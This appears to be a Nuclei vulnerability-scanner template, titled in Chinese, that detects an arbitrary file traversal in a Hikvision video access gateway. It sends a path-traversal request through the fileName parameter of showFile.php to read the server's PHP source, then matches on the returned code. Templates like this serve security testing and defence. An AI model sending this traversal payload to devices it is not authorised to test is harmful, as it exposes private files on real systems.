id: Hikvision 视频接入网关-任意文件遍历

info:
  name: Hikvision 视频接入网关-任意文件遍历
  author: wintry
  severity: critical
  tags: hikvision

http:
  - raw:
      - |
        GET /serverLog/showFile.php?fileName=../web/html/serverLog/showFile.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '&lt;?php'
          - '$file_name = $_GET['
        condition: and
